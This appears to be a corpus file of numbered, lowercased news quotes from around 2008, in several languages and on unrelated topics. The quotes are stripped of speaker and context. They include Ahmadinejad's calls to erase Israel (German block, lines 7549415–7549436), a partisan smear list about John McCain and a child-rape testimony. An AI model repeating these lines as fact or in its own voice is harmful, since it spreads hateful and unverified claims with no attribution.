7549176 lets take a wager that the bbc brand is the best tv brand in the world that people will pay for that brand
7549177 let it hold on to all of its free channels and radio stations but let it also build a new subscription service that will provide the very best in what the british television industry the best in the world can do
7549178 theres too much at stake too vital a contribution to our culture to let its critics start to pull it apart now i want it to fight back with all the energy and resources it has more specifically i want it to plug a gap i still see in the british tv market one which once filled can give the individual programme maker the impetus to make the distinctive the surprising the lavish the intimate the experimental unhampered by the constraints the bbc normally has to operate under

7549193 she won millions of votes but isnt on the ticket why for speaking the truth
7549194 support of barack obama is clear she has said repeatedly that barack obama and she share a commitment to changing the direction of the country getting us out of iraq and expanding access to health care john mccain doesnt its interesting how those remarks didnt make it into his ad
7549195 there are a lot of delegates here who had passionate choices in an extended primary season
7549196 we feel confidant that if we can demonstrate a record of change a record of vision a team of barack obama and joe biden can convince democrats republicans and independents to support a ticket of change in november

7549260 we are going to create a social problem to solve another social problem and at the expense of those who are least able to articulate their predicament
7549261 the social engineers will come in and tinker with it to save a few quid which they are always willing to do at the bottom end of the scale they are not that keen on doing it at the top end

7549275 with an international shortage of pediatric icu nurses there are sometimes limits on the number of icu beds that can be safely opened
7549276 however the brumby government has significantly increased the states neonatal and pediatric icu capacity from 52 beds in 2000 to 72 beds in 2008
7549277 we are building a brand new 1 billion state of the art childrens hospital with the capacity to treat an extra 35 000 patients every year
7549278 i havent committed any sort of firearms offences they have seized a cigarette lighter that looks like a 38 calibre gun and they tried to link it to a home invasion or an armed robbery that i had nothing to do with
7549279 it looks like a gun it doesnt fire bullets you squeeze the trigger and flames come out it could have singed someones curtains thats about all
7549280 why didnt they get him when it is said to have happened in early august
7549281 hes not a hard person to find i mean hes got no ears for gods sake
7549282 we want to make sure that ordinary australians are not going to be hurt
7549283 the government of the day cant just shove it through without taking into account unintended consequences
7549284 the 22 billion surplus is an important buffer against declining economic growth
7549285 one of the goals of the film is to showcase truck drivers as a vital and proud breed of the american workforce
7549286 it chronicles three truck drivers in varying stages in life yet all passionate about their profession and the role they play in the economy
7549287 im a big fan of westerns and a big fan of cowboys and to me truckers sort of personified that part of american mythology
7549288 these guys are all used to being their own boss and now theres a film crew there and theyre not alone we had to get certain shots now and again and theyre not used to people telling them what to do
7549289 i never had a boss and all of a sudden i had 30 bosses
7549290 i think people think of us as second class citizens
7549291 there are people who literally lay their lives down on the road to make sure people get their groceries the next day
7549292 i wondered whats this going to cost me to fix but i fell instantly in love with that truck especially the front air suspension with the torsion bar ive never had a truck handle like that
7549293 i develop positioning strategies for small businesses that differentiates them i appreciate working with companies who see the value of going beyond mere slogans and have a desire to sell from compelling positions opportunities come to light in every discussion
7549294 ik denk dat ik niet goed genoeg ben om deze klus aan te kunnen
7549295 ik vertrouw op mijn zelf dat ik ik in staat ben op alles op mijn pad aan te kunnen

7549303 i followed that nagging discontent back to its source and found as is often the case a nasty little lie in a dark hole
7549304 we have a good energy about us at the moment no matter what other people think
7549305 we are in a good position and it is a great carrot for the team to have the chance of claiming a place in the next round of the uefa cup
7549306 but at the same time the tie is a long way from being finished
7549307 we must be ready for the task and we are
7549308 she had to think very practically about how do you make money
7549309 how does the system work that led me to have an orientation to ask hardheaded questions during my formative years there was still ideological competition between a social democratic or even socialist agenda and a free market milton friedman agenda i think it was natural for me to ask questions of both sides and maybe try to synthesize approaches
7549310 ive never worked with a campaign that was more interested in what the research shows
7549311 s que joe har una buena campa a con obama y pienso que ser formidable
7549312 obviamente joe y yo hemos estado en diferentes campos filos ficos pero le considero un buen amigo y un buen hombre
7549313 el apoyo de la senadora para barack obama es claro
7549314 clinton ha dicho repetidas veces que barack obama y ella comparten el compromiso de cambiar el rumbo del pa s de sacar a eeuu de irak y de ampliar el acceso a la asistencia m dica
7549315 es interesante que eso no aparezca en el aviso de los republicanos
7549316 the system should process pending orders when inventory is available
7549317 i like the feeling of space and brightness and airiness

7549331 we were arrested and taken to a university for questioning we were held for nearly 24 hours without any sleep and were interrogated for up to about eight hours
7549332 the guys i was with were given the reason that it was illegal to undertake even a peaceful protest and to talk about the situation in tibet
7549333 they seemed to have decided to really clamp down on protesters
7549334 before you settle in it seems there is a problem we seldom see a high official around these parts you see so were not sure what to do with you
7549335 well id like to but i have orders from higher up what well do is have you spend one day in hell and one day in heaven then you can choose where to spend eternity
7549336 well then youve spent a day in hell and another in heaven now choose your eternity
7549337 well i would never have said it before i mean heaven has been delightful and all but i think i would be happier in hell
7549338 yesterday i was here and there was a golf course and clubhouse and we ate lobster and caviar drank champagne and danced and had a great time now theres nothing but a wasteland full of garbage and all of my friends look miserable what happened
7549339 interestingly one group that over consumes the mini packs is chronic dieters
7549340 on the one hand consumers perceive the mini packs to be a generous portion of food numerous small food morsels in each pack and multiple mini packs in each box on the other hand consumers perceive the mini packs to be diet food for chronic dieters this perceptual dilemma causes a tendency to overeat due to their emotion laden relationship with food
7549341 while restrained eaters may be attracted to smaller foods in smaller packages initially presumably because these products are thought to help consumers with their diets our research shows that restrained eaters actually tend to consume more of these foods than they would of regular foods

7549365 so while obama can continue to try to reassure resistant clinton loyalists in appalachia that hes not a bogeyman from madrassaland

7549386 chris hoys three gold medals will inspire those in team scotland next year at the maccabiah games
7549387 ive won six medals for team gb at various european maccabiah games and it felt great
7549388 but to be honest i would prefer to be representing scotland than great britain
7549389 the decision to break away was actually done with the support of team gb so theres been none of the stuff were seeing in the papers just now
7549390 it was entirely mutual and friendly which is what we expected
7549391 getting the support of alex salmond and the snp is terrific and we really welcome that
7549392 the debate for a lot of jewish people now is to decide whether they want to represent gb or scotland but i for one am really excited about competing in israel representing my country
7549393 over the years i have seen the number of participating countries grow and my wish has always been for scotland to be one of them
7549394 its a fantastic opportunity for scottish sportsmen and women to participate at the highest level of jewish sport
7549395 the success of the scottish competitors at the olympics has lifted the country and in our own way we hope the maccabiah will do the same
7549396 ive played for gb in israel before but theres nothing quite like the good old scottish banter
7549397 nothing can compare to being away with the lads and being part of your home football team
7549398 team gb have performed tremendously and the highlight for all scots is undoubtedly seeing chris hoy grab that third gold medal
7549399 we are immensely proud of all our olympians and i am sure their success will inspire those in team scotland next year at the 18th maccabiah games
7549400 the maccabiah games is one of the biggest sporting competitions in the world and it is great to see a scottish team taking part for the first time
7549401 it is always good to see scottish athletes taking part in any international competition

7549413 irans aussage von der zerst rung israels darf in der bersetzung nicht verloren gehen
7549414 die dpa wird in zukunft bei der berichterstattung darauf achten dass der iranische pr sident mahmud ahmadinedschad nicht die ausl schung israels oder dessen tilgung von der landkarte gefordert hat
7549415 dieser satz den der iranische pr sident tats chlich formuliert hat ist eine v lkerrechtlich korrekte forderung da haben die katholischen bisch fe vor ein paar wochen sich noch viel drastischer ber die israelische ghetto politik ge u ert
7549416 die zionisten werfen uns vorbereitungen auf einen m glichen angriff vor das ist aber eine l ge die iranische nation hat nie in ihrer geschichte jemanden angegriffen
7549417 meinen sie nicht dass diese positionen in irgendeiner weise dazu beitragen iran von der internationalen gemeinschaft zu isolieren
7549418 was ich ber das zionistische regime gesagt habe war vor allem eine ank ndigung was ich ank ndigte war dass dieses regime sich bald aufl st und zusammenbricht
7549419 der einfluss der zionisten auf die westlichen und europ ischen staaten f hrt leider solche tumulte herbei und dann nutzen sie auch noch die gelegenheit aus dies mit einem atomenergie problem in verbindung zu bringen jener ignorant der dies zum ersten mal sagte hat gar nicht verstanden dass die atomwaffe f r die beseitigung von regierungen und systemen und regimen nicht taugt systeme und regime verschwinden nicht mit hilfe der atomwaffe die atomwaffe kann nur menschen und landstriche vernichten
7549420 das zionistische regime das ein usurpations und illegales regime und ein krebsgeschw r ist mu von der landkarte getilgt werden
7549421 das zionistische regime sieht seinem absoluten ende entgegen das korrupte element wird von der landkarte getilgt werden
7549422 oh lieber imam khomeini du hattest einst zu sagen geruht dass das zionistische regime ein usurpations und illegales regime und ein krebsgeschw r ist das von der seite des zeitenlaufs verschwinden muss heute nun entbiete ich ihnen respektvoll meine antwort diese erleuchtende und weg weisende rede und dieses ihr sehnen sind an der schwelle frucht zu tragen das zionistische regime hat die philosophie f r seine existenz aus der hand gegeben das zionistische regime befindet sich in einer absoluten sackgasse und ihr wunsch imam chomeini wird bald wirklichkeit und dieser keim der verderbnis wird verschwinden
7549423 es gibt keinen zweifel die neue anschlagswelle in pal stina wird das stigma im antlitz der islamischen welt ausradieren
7549424 ich zweifle nicht daran dass die neue welle die im geliebten pal stina begonnen hat und welche wir heute in der islamischen welt beobachten eine welle der moral ist sie hat die gesamte islamische welt erfasst und wird sehr bald den schandfleck aus dem scho der islamischen welt beseitigen
7549425 der iranische pr sident mahmud ahmadinedschad hat dem staat israel mit der vernichtung gedroht der j dische staat sei auf dem weg zur vernichtung
7549426 so wie die sowjetunion verschwunden ist wird auch das zionistische regime verschwinden und die menschheit wird befreit sein
7549427 dass dieses jerusalem besetzende regime von den seiten der zeit getilgt werden muss
7549428 unser lieber imam khomeini hatte zu sagen geruht das regime das jerusalem besetzt h lt m sse aus den annalen der geschichte verschwinden
7549429 mit seiner u erung israel von der landkarte tilgen zu wollen sorgte irans pr sident mahmud ahmadinedschad im oktober 2005 weltweit f r emp rung
7549430 immer wieder sorgt irans pr sident mahmud ahmadinedschad f r aufsehen durch seine israelfeindlichen und antisemitischen u erungen
7549431 dies ist eine kurze phase wenn wir sie mit erfolg hinter uns gebracht haben wird so gott will der prozess des verschwindens des regimes das al qods die heilige jerusalem besetzt h lt und die einrichtung der nationalen regierung pal stinas ein glatter und einfacher vorgang sein
7549432 irans talk of destroying israel must not get lost in translation
7549433 die iranische f hrung in ihren eigenen worten ber die vernichtung israels ein pl doyer gegen apologetische kampagnen zur entschuldung des aufrufs zum v lkermord
7549434 what iranian leaders really say about doing away with israel a refutation of the campaign to excuse ahmadinejads incitement to genocide

7549436 the zionist regime is a decaying and crumbling tree that will fall with a storm

7549446 we went down there to do a piece on him about how great he was and what the people of beijing thought about him
7549447 but it was unbelievable i cant imagine how he would feel if he went down there i dont know what gives it away
7549448 i think people took the mickey out of him in school for having big ears hes certainly a lot thinner than i am i mean i must be 50 pounds heavier than he is you know
7549449 this probably comes as no surprise given grain prices that farmland value was up fairly sharply
7549450 this was the second year in a row that weve had double digit increases in farmland values in the state of indiana
7549451 as far as cash rents this is the strongest increase weve had since the early 1970s when we had the demand shock of exports booming and prices going up
7549452 cash rent averaged 194 an acre for top quality land 157 an acre for average quality land and 123 an acre for poor quality land
7549453 interest rates are still quite moderate relative to their historical levels and so if one has to borrow money to make a land purchase that can be done fairly inexpensively now
7549454 another important factor is the supply of farmland thats available for sale
7549455 there is just not an abundance of farmland on the market at this point in time and if you are going to make a purchase youve got to convince somebody else to let go and that takes a fairly high price
7549456 given where interest rates are and the inflation outlook it seems more likely that interest rates will increase rather than decrease
7549457 by using a fixed rate loan you can lock in an interest rate at a fairly low level now
7549458 while weve had somewhat of a downward turn in corn and soybean prices we are still substantially above where we were a few years ago
7549459 the return side still looks fairly strong and interest rates look like they are going to be quite favorable which means things seem to be in place for positive upward movement in farmland value in the future
7549460 thats up about 10 a hundredweight compared to last year
7549461 they are having to ship that either by rail or by semi from oregon so that makes it a lot more expensive
7549462 where they can they will ship it by train railroad car and thats not too bad because the prices are pretty good there if they have to ship by semi then it is probably another 5 or 6 a hundredweight
7549463 theyll lose about 30 days of grazing but they will offset winter feeding costs and the clover will provide n nitrogen for the warm season grasses the next summer
7549464 the most popular resources are the live and archived web casts
7549465 when we have a live web cast people from about 100 sites log on but each recorded web cast receives more than 70 views every month
7549466 beyond people that advise producers county extension agents natural resources conservation service nrcs staff and consultants we are finding policy makers producers the general public and even other scientists are using the web site
7549467 it is the best science based information on manure compiled from around the country to a single site users are coming to it to answer specific questions for general education and for continuing education
7549468 crops need soaking rain some areas received light rain but not a meaningful quantity farmers many areas anxious for rain to boost crop growth and relieve dry soils across state
7549469 students who followed most of the television broadcasts from the winter olympics in torino got a less favourable impression of the italian people as a result of the event
7549470 overall there are good reasons for questioning whether a sensible decision maker should stake several billions of kroner on organising the olympics if economic development and promoting of the country are the essential issues
7549471 the marketing effect of organising the olympics is not necessarily good in that respect the troms olympics is a high risk project
7549472 i am sorry i have not received the fax that shows that indeed your accommodation has been paid for
7549473 but you do not have to worry because bimc will be organising some press conferences and events that might be of interest to you and your readers
7549474 we needed to show the world that we can host this event and host it very well
7549475 some foreign media have different opinions about us and we also have our own opinions but people should always strive to make balanced reports so that readers can judge for themselves

7549478 im shocked by the video when i look at amy is a drug addict and she has now been caught twice on film taking illegal drugs they should arrest her and put her behind bars
7549479 rehab clinics are a waste of money unless you want them to work
7549480 amy doesnt want to give up drugs so shes got to learn the hard way in prison
7549481 police have to act she is making a mockery of the law it has got to stop
7549482 my position is that a sensible jury would not expect people to be sniffing talcum powder
7549483 when he went in pentonville last november he was in a terrible mess his skin was a horrible dirty yellow colour he was painfully thin and he had dead eyes i will never forget that haunted look i feared we were going to lose him
7549484 but they gave him amazing medical treatment in prison to get him off drugs and then helped him conquer his personal demons
7549485 now nine months on he looks amazing he has put on nearly two stone in weight his skin is glowing with health and he is so relaxed and happy amy
7549486 blakes been given his own room with an ensuite shower
7549487 he also has a tv cd player and a shelf full of books in his room
7549488 he even has his own key so he can lock himself in if he wants privacy
7549489 its so much nicer than pentonville which was the pitts
7549490 they are respectful and dont even mention her name to him blake has chosen to do an educational course to keep him busy and is doing art and writing
7549491 i hope this time it works but i have heard it so many times before i havent any faith in her blake last weekend but was turned away because she was too late blake but she had a driver and she still couldnt turn up on time
7549492 blake was not impressed he is only allowed three visits a month has just deteriorated more and more while he has managed to get himself clean inside
7549493 blake told me i promise you mum when i get out of prison i will sort
7549494 she needs to stay in there for the next four months until

7549503 i dont think its right that the pictures of the driver and the license plate are shipped off to a contractor who decides whether this stands out as a violation
7549504 the benefit of being pulled over by a trooper if there is any benefit is that there is a law enforcement person who is saying that you sped
7549505 i will tell you that the court has no discretion in setting the amounts of fines and i am required by law to impose them in full

7549518 wired coms survey of iphone 3g users suggests that widespread data speed problems have more to do with carriers networks than with apples handsets
7549519 recently wired com asked iphone 3g users all around the world to participate in a study which involved testing their 3g speeds and entering their data on an interactive map the purpose to gain a general idea of how 3g was performing where its best and where its worst in light of widespread complaints about the handsets network performance more than 2 600 people participated wow and weve diligently cleaned up the data to present it to you
7549520 to speak very generally the data overall shows that 3g is performing faster than edge which is expected in the best scenarios 3g is up to seven times faster than edge in worse scenarios 3g performed just as slowly as edge at worst some users couldnt connect to 3g at all which isnt surprising since 3g towers are not yet ubiquitous
7549521 in our view this data is a strong indicator that performance of the mobile carriers network is affecting the iphone 3g more than the handset itself this also furthers our thesis that its highly unlikely that apple is going to wave a magical wand and say 3g problems be gone with a software update before apple can make such a claim it needs to wait for all of its carriers to optimize 3g network behavior in terms of number of towers how theyre positioned and how much bandwidth each tower can handle

7549526 john mccain was leader of the keating five and interceded on behalf of convict charles keating in the s amp l fraud which cost taxpayers billions john mccain got a taxpayer funded education at the us naval academy because his father and grandfather were both u s navy admirals john mccain graduated fifth from the bottom of his class at the us naval academy john mccain is an ace of the viet nam war destroying five aircraft it should be noted that he was the pilot of each of those downed aircraft john mccain pledged the proceeds from public campaign financing which reform legislation is one of his major credits to collateralize a loan then he broke his own law by saying he was not bound by his pledge john mccain continues to advocate tax cuts for only the wealthiest citizens if john mccain were black people would call him a looter
7549527 the first step on the road to insuring that women are not habitually forced to wait on much longer rest room lines than men was to require that women have at least as many outlets as men
7549528 because the house provides rest room facilities directly adjacent to the floor of the house for male members so they need miss few if any votes or other proceedings but does not provide any rest room facilities whatsoever adjacent to the floor for female members the house appeared to be in violation of title vii of the civil rights act and of the equal protection clause of the u s constitution
7549529 i hope this complaint will serve as a catalyst to prod pelosi into forcing the house to do what the body should have done years ago when the senate provided rest room access just off the floor to its seven female senators or the supreme court provided equal rest room access to female justices
7549530 in place of the portland ballet we have a doubleheader related to ragtime music and scott joplin

7549534 balance the feminist doctrine and dogma with a masculine curriculum or program
7549535 feminist scholarship is often thought to be biased because it self consciously and deliberately includes information about women whereas conventional androcentric scholarship is not similarly regarded as biased because it includes more information about men
7549536 the male norm and the human norm are collapsed and seen as identical femaleness is is viewed as an exception to the norm
7549537 placing one gender in the center and the other on the periphery
7549538 the anxiety that some men in developed countries face as a result of their loss of privilege and clear gender roles in light of the feminist movement
7549539 the defendants advocacy and furthering of feminism and training of feminists derogates males while propagandizing the superiority of females with a harm similar although not as egregious as the nazification of universities in germany during the 1930s when education demonized the jews while demanding genuflection to an aryan throne

7549551 we will be honoring the legacy and leadership of stephanie tubbs jones with a celebration of her life
7549552 biden has been so critical in the past of obama not of him personally but of his foreign policy background and experience i certainly think thats going to be an issue i think senator bidens words during the primary will be looked at very closely and carefully now that he is barack obamas vp candidate
7549553 and i was right it was the hardest job i could find
7549554 i worked all night and on the weekends and had all the tombstones ads that appear in financial publications following a deal to prove it

7549561 we will look at all options for alternatives we know that this is really important to make sure that our culture will be seen at the international level its not only good for our country its part of our identity and on the other side we know that has a wonderful impact on our economy
7549562 what i will always remind mr coderre is that when he was around the table in cabinet he helped draft the famous sponsorship program so im not sure that i have to listen to any kind of best way to do things about culture from the liberals
7549563 we have to work in a way to get more results im not saying that we havent had some good results from these programs but we have to do more to have more

7549597 hay cansancio eso lo hemos evidenciado hay p rdida del sentido de lucha y por eso creemos que hay una situaci n madura para las desmovilizaciones colectivas el reto es convencerlos de que tambi n con ellos podemos pactar procesos dignos
7549598 sabemos que hay temor entre muchos de ellos y sus mandos quieren dejar las armas pero entre ellos no tienen la confianza para plantearlo y es hora de que lo hagan que entiendan que el gobierno est dispuesto a brindarles las condiciones para esto

7549627 the marks of a true ambassador of christ are telling and interpreting the life death and resurrection of christ and then pleading with sinners in christs stead to be reconciled to god by repenting and receiving jesus christ as lord and savior

7549664 the radical behavioral change that is needed to reduce hiv transmission requires radical commitment
7549665 prevention strategies will never work if they are not implemented completely with appropriate resources and benchmarks and with a view toward sustainability the fundamentals of hiv prevention need to be agreed upon funded implemented measured and achieved that presently is not the case

7549682 patients managed medically without stenting or bypass surgery tend to be elderly and frail and in some sense we feel they have been overlooked
7549683 we wanted to find out what clinical factors were funneling them into a medicine only group and what happened to them when compared to patients who received stents and bypass procedures
7549684 it is important to know that the patients in the medically managed group had a higher death rate despite receiving most of the currently recommended medications for this condition from clinical practice guidelines
7549685 there are often very good reasons why stenting or bypass are not viable options for some patients what this study tells us is that for these patients who are medically managed we need to come up with better treatment approaches that lessen their risk of death
7549686 after i was released i was afraid to stay alone in the dark i dont know why when i enter into a dark room i get frightened i immediately switch on the light and run away
7549687 my son was held for seven days before they released him
7549688 they locked him in a shed all by himself with rats in the darkness before he was kidnapped he was never afraid but after that he became terrified of the dark he goes to bed very late at night and he can only sleep after exhausting himself he insists on burying his head under my arm to feel safe when he sleeps
7549689 i have a female she is 13 years old she exposed to kidnapped they raped her and made sexual intercourse with her for about 4 days daily

7549699 tough new tack has some patient groups unsettled saying it could scare off patients
7549700 dont take a chance stick with the hiv medicine thats working for you
7549701 will the hiv medicine make my skin or eyes turn yellow
7549702 while we acknowledge that some people may find the headline and imagery of the materials to be provocative gsk stands firmly behind the ads and their underlying message patients considering changing hiv therapy ought to consult closely with their physician to fully understand the near and potential long term health implications of such changes
7549703 just as likely to encourage a patient to stay with another medicine as it is one of our own assuming that the medicine is working for a patient and is well tolerated
7549704 ends this september and as always we will take all the community feedback we have received into consideration for future campaigns
7549705 ask your doctor if there are hiv medications with a low risk of diarrhea
7549706 kaletra has a well established side effect profile and profound and sustained effectiveness in combating hiv
7549707 market for hiv medicines has grown crowded and companies want to protect their market share
7549708 treatments have become so comparable so companies are really trying to split hairs to have a marketing advantage
7549709 hospice and palliative medicine is a newly recognized medical subspecialty
7549710 this unique specialty reflects the need for specialized medical care for the growing number of older adults and persons with serious complex and chronic illnesses which currently pose an enormous challenge to the healthcare industry
7549711 there is a much greater demand than supply of physicians skilled in hospice and palliative medicine
7549712 well trained physicians in this field have unlimited opportunities aahpm is steadily expanding educational opportunities so that physicians who want to move into hospice and palliative medicine have more learning opportunities
7549713 the unipac book series helps to form a strong foundation for developing these skills
7549714 like good textbooks the unipac booklets have multiple contributors and have been peer reviewed by the leaders in the field
7549715 biologists have known that in these beetles there is an investment trade off between secondary sexual characters and primary sexual characters
7549716 as horns get bigger copulatory organs get smaller or vice versa what was not known was how frequently and how fast this can occur in nature and whether this can drive the evolution of new species
7549717 in terms of the integrity of a species its important for these things not to change too much
7549718 so there is a lot of evidence suggesting that within species or within the populations of species natural selection maintains genital characters but if these primary sex characters are linked to other characters that can change readily then youve got what we think is a very exciting mechanism that could prime populations for reproductive isolation
7549719 if this is all it takes to change genitalia it may be easier to make new species than we thought
7549720 there is always a very delicate balance between newly formed cells and dying cells
7549721 its a very active period of that balance because usually you develop a surplus of tissue then later melt it back down to acquire a specific shape
7549722 the digits form because the inter digital tissue dies if it did not die we would have paddles instead of hands with fingers
7549723 you have to make people aware of the science behind the risk
7549724 we are not saying that every pregnant woman who drinks three or four glasses of wine in a short period will have a baby with birth defects but it elevates the risk
7549725 the limited success of existing therapy suggested to us that factors besides erbb2 or proteins that collude with erbb2 might nullify the effects of herceptin and lapatinib
7549726 our results might explain why the strategy of using erbb2 inhibitors alone to treat breast cancers has fallen short
7549727 these findings may also suggest a way to treat patients with advanced erbb2 positive tumors and those whove developed resistance to erbb2 inhibitors an idea that were eager to test
7549728 if erbb2 is the accelerator that makes the car move brk helps shift the gear to gain more speed
7549729 we might need to hit erbb2 expressing cancers with drugs against both erbb2 and brk
7549730 brk does not promote the proliferation of normal cells and its expression in normal tissues is restricted to non proliferating cells
7549731 produce fewer unwanted side effects than targeting other cancer promoting proteins
7549732 we also think that brk would be an ideal clinical marker than could be used to provide both a diagnosis and prognosis for breast cancer
7549733 brk is coamplified with erbb2 to promote proliferation in breast cancer
7549734 we made several improvements in the technique that could allow us to perform this type of procedure routinely
7549735 we traditionally try to save the kidney for smaller tumors performing a robotic partial nephrectomy
7549736 for larger tumors however patients would get a very large incision on their side now we can remove kidneys with cancer through a single three inch incision near the patients belly button
7549737 i think this is going to be a big advance for having to remove the entire kidney because of large kidney tumors this could be a great improvement over traditional open and laparoscopic surgeries
7549738 the robotic instruments are like having my hands inside the body
7549739 turning the house upside down adding weight to it and shaking it
7549740 my brain gets fried and i cant do anything i just shut down completely when we start on this next one well just bring our demos to practice and well listen to them judge them and start rearranging the parts that need to be rearranged or we just start jamming on what sounds cool
7549741 fundamental breakthroughs in these directions are expected on a time scale of 10 to 20 years and are recognized by the international science community as major milestones on the road to a renewable fuel
7549742 molecular bioenergetics of cyanobacteria towards systems biology level of understanding
7549743 the lower fertility and growth rates among the creatures exposed to contaminants is probably a stress response
7549744 these crustaceans are sensitive to heavy metals such as copper cadmium and zinc and scientists use them as a test organisms for assessing the toxicity of marine sediments says ms chung
7549745 they accumulate heavy metals inside their tissues and scientists use them to monitor environmental pollutants
7549746 parents usually dont understand their role in the course of their childs career development and cross the line between involvement and intervention
7549747 sports is one of the most popular interests in the school this can be seen by the fact that the athletes needs are met through designing special programs consideration of their needs consideration of their teachers competitions and placing the school athletics program high on our list of priorities
7549748 sports is as popular a subject as communications and electronics but sports raise school pride while other areas of study do not
7549749 they are cognizant of their own needs but not the needs of others its not a good part of their character or their personality the contempt for others their condescending behavior and their feeling of superiority
7549750 when firefox users click on a web site that uses a self signed certificate they get a security error message that leaves many people bewildered

7549759 an investment of 41 million in fertilizer research through 1981 returned an incredible 57 billion to u s agriculture
7549760 that doesnt include benefits of the technology to the rest of the world
7549761 tvas fertilizer program is recognized as one of the most effective research and development programs of any u s agency its benefits to the world far outweigh the public investment that the united states made in fertilizer research and development
7549762 its time to launch a radical initiative to develop a new generation of energy efficient fertilizers to help avert hunger and famine
7549763 tva technology fueled the sweeping advances of u s farmers in food and fiber production in the 60s to 80s
7549764 today fertilizers are responsible for more than a third of total u s crop production
7549765 the 57 billion return from a 41 million investment included about 49 billion from use of high analysis fertilizers and 8 billion from process development and improvement thats a benefit cost ratio of more than 20 to 1
7549766 tva followed promising new fertilizers from conception to production to national acceptance by farmers and the fertilizer industry
7549767 its program was based on fundamental research followed by process development and technology transfer
7549768 tva then stopped work on that project and moved to develop newer and more promising technologies
7549769 i am concerned about the state of the fertilizer industry itself
7549770 work should begin now on the next generation of fertilizer products using advanced techniques such as nanotechnology and molecular biology especially in conjunction with plant genetics research smart fertilizer products that will release nutrients only at the time and in the amount needed should be developed
7549771 the world needs a major research effort to improve the effectiveness of fertilizer production and use
7549772 fertilizer is a commodity industry and it is unlikely the industry alone will undertake the research some public investment is probably required
7549773 to decisively step up investment in science and technology for food and agriculture
7549774 the need for increased food is escalating but new agricultural technology is not keeping pace
7549775 an effective research program to develop a new range of fertilizers should be a key element of any long term strategy to alleviate the food crisis
7549776 most fertilizer products used today were developed when energy seemed abundant and cheap but with rising prices we should develop a new generation of fertilizer products that use plant nutrients more efficiently
7549777 such innovations will require investments in research but such costs would be miniscule compared to the benefits for humanity
7549778 ifdc is in a unique position to meet this challenge

7549784 if there is a real commitment to protect all children then supporting families and children before they reach the point of being abused and neglected should be a priority
7549785 we already know many of the risk factors for child abuse and neglect and in many cases we could identify many children who are most vulnerable before theyre even born
7549786 the current approach does little to prevent abuse but focuses on intervening once much of the harm has already been done an approach that in my view is both unethical and inhumane
7549787 while urgent action is needed to protect children being abused and neglected we need to broaden adult focussed services such as alcohol and drug treatment mental health corrections homelessness family violence etc so that they can enhance the parenting of their clients
7549788 we also need to use health promotion campaigns with messages such as alcohol and children dont mix given that one in eight australian children now lives in a household with at least one adult who is regularly binge drinking
7549789 child abuse and neglect needs to be attacked in the same comprehensive way we have tackled other serious health issues such as smoking or coronary heart disease that is to identify the risk factors promote a range of interventions and change community attitudes

7549798 the group believes that in particular given the current difficult capital market conditions an acceptable proposal capable of being implemented by dec 15 is unlikely to be forthcoming
7549799 while banks have provisioned for their exposure to date it would be of some concern to lenders that neither asset sales or an equity injection is a near term possibility
7549800 suggestions that a debt equity hybrid swap may be required would be highly dilutive to current equity holders and cause greater concerns to syndicate banks and note holders
